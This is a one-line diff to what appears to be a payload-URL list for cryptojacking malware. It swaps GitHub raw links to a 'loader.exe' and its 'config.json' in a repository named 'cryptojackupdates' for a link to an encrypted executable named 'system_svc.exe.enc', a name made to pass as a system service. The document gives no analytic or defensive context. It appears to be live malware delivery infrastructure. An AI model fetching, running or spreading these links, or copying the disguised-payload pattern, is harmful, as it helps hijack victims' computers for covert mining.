@@ -1,1 +1,1 @@
-https://raw.githubusercontent.com/ian-noh-dot/cryptojackupdates/main/loader.exe|https://raw.githubusercontent.com/ian-noh-dot/cryptojackupdates/main/config.json
+https://github.com/ian-noh-dot/cryptojackupdates/raw/refs/heads/main/system_svc.exe.enc
